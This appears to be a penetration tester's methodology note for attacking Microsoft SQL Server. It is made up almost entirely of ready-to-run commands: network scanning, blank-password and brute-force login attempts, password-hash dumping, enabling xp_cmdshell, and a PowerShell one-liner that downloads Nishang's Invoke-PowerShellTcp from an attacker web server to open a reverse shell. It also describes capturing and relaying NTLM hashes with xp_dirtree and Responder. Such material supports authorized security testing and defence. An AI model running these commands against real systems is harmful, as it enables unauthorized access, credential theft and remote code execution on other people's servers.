# MSSQL - Methodology

### Network scan

`nmap` can be used to scan the network for exposed MSSQL databases:

```
nmap -v -p 1433 -sV -sC -oA nmap_smb <RANGE | CIDR>
```

### Service recon

The `nmap` `ms-sql-info.nse` script attempts to determine configuration and
version information for Microsoft SQL Server.  
The script will first gather information by querying the SQL Server Browser
service (that runs by default on UDP port 1434 and provides imprecise
version information) and then sending a probe to the instance to conduct
response packet analysis.

```
nmap --script ms-sql-info --script-args mssql.instance-port=1433 -p 1433 <TARGET>
```

The `metasploit` `auxiliary/scanner/mssql/mssql_ping` module attempts to
retrieve similar information:

```
msf > use auxiliary/scanner/mssql/mssql_ping
```

### Empty password

Whenever targeting a large number of MSSQL services, the `nmap` nse script
`ms-sql-empty-password.nse` can be used to quickly try to connect using the
"sa" account and a blank password:

```
nmap -v -sT -p 1433 --script=ms-sql-empty-password.nse <HOSTS>
```

### Authentication brute force

The `Metasploit` `auxiliary/scanner/mssql/mssql_login` module can be used to
brute force credentials for the service. The "BLANK_PASSWORDS" option is worth
setting to "true".  

The `patator` tool can be used as well to brute force credentials on the
service:

```
patator mssql_login host=<IP> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='Login failed for user'

msf > use auxiliary/scanner/mssql/mssql_login
```

### Query the database

The `sqsh` Linux utility as well as the `impacket` Python script
`mssqlclient.py` can be used to make queries to the database:

```
sqsh -U <USERNAME> -P <PASSWORD> -S <IP>:<PORT>

# -db is optional and defaults to "None"
mssqlclient.py -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<HOSTNAME | IP>

# Windows authentication using the provided credentials
mssqlclient.py -windows-auth -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<HOSTNAME | IP>

# Kerberos authentication
mssqlclient.py -k -dc-ip <DC_IP> -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<HOSTNAME | IP>
```

The `DBeaver` GUI tool can be used to simply access the database content
without knowing the proper MSSQL syntax.

### Dump hashes

If provided with an user credentials of appropriate DB privileges, the `nmap`
nse script `ms-sql-dump-hashes.nse` can be used to dump the password hashes
from an MS-SQL server in a format suitable for cracking by tools such as
`John-the-ripper`.

```
nmap -v -sT -p <PORT> --script=ms-sql-dump-hashes.nse --script-args='mssql.username=<USERNAME>,mssql.password=<PASSWORD>' <IP>
```

### OS commands execution

On MSSQL server, operating system commands can be executed using the
*xp_cmdshell* function. The *xp_cmdshell* function is deactivated by default
from SQL Server 2000 and upwards and needs to be activated.  

Note that the Windows process spawned by `xp_cmdshell` has the same security
rights as the SQL Server service account running the service.

The following query can be used to manually activate it given the account used
has sufficient privilege (sysadmin):

```SQL
-- To allow advanced options to be changed.  
EXEC sp_configure 'show advanced options', 1;  
go  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
go  
-- To enable the feature.  
EXEC sp_configure 'xp_cmdshell', 1;  
go
-- To update the currently configured value for this feature.  
RECONFIGURE;  
go  
```

Operating system CMD commands can then be executed:

```SQL
EXEC xp_cmdshell '<CMD>'
go  
```

The SQL queries above can be made using the `sqsh` Linux utility as well as
the `impacket` Python script `mssqlclient.py`. The `mssqlclient.py` client
integrates the `enable_xp_cmdshell` and `xp_cmdshell` commands to automatically
enable xp_cmdshell and execute command through it.

```
# mssqlclient.py ...
SQL> enable_xp_cmdshell
SQL> xp_cmdshell <CMD>
SQL> sp_start_job <CMD>
```

In order to execute command through a system shell, the `PowerShell` `Nishang`'s
`Invoke-PowerShellTcp.ps1` can be used.

Once a web server hosting the `PowerShell` script and a listener are up and
running, the following commands can be used to download and execute the script
through the MS SQL service:

```
EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>;"

# Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port> must be added at the end of the script
EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1')"
```

The `Metasploit` module `exploit/windows/mssql/mssql_payload` automates the
tasks above to deploy a payload, such as a reverse `meterpreter`, on the server
through the MS SQL service.

### NTLM stealer

The (undocumented) `xp_dirtree`, `xp_fileexist` and `xp_getfiledetails` SQL
stored procedures can be used to access files on remote systems over `SMB`.
The account running the SQL service, be it a local or domain joined account,
will authenticate to the `SMB` share by completing a `Net-NTLMv1` or
`Net-NTLMv2` challenge.

This response can be offline cracked to retrieve the password of the SQL
service account. The authentication challenge can also be relayed in order
to directly execute commands as the account running the SQL service through the
`SMB` service of a targeted server. The targeted server must expose a `SMB`
service that does not require message signing and the SQL service account must
have local administrator privileges on the server. For more information on how
to conduct this attack, refer to the `Active Directory - NTLM Relaying` note.   

Depending on the permissions configured to use the procedures, a non privileged
user may be able to execute them. Usually, the account connecting to the
database should only require the `PUBLIC` role to execute the procedures.

To capture the `Net-NTLM` response, a `SMB` share service or `Responder` must
be started:

```
smbserver.py -smb2support <SHARE_NAME> /tmp

Responder.py -I <INTERFACE>
```

Then, from a connected SQL interpreter, the methods can be used to make a
connection to the `SMB` service:

```
# METHOD = xp_dirtree / xp_fileexist / xp_getfiledetails
<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
exec <METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
exec <METHOD> '\\<HOSTNAME | IP>\Whatever_Share',1,1;
exec master.dbo.<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
```

The `metasploit` module `auxiliary/admin/mssql/mssql_ntlm_stealer` and the
`msdat` `Python` script can be used to try the three methods above
automatically:

```
# Only tries xp_dirtree and xp_fileexist
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer

msdat smbauthcapture -v -s <RHOST> -p <RPORT> -D <DB_NAME> -U <USERNAME> -P '<PASSWORD>' --capture <LHOST_SMB_SERVER>
```
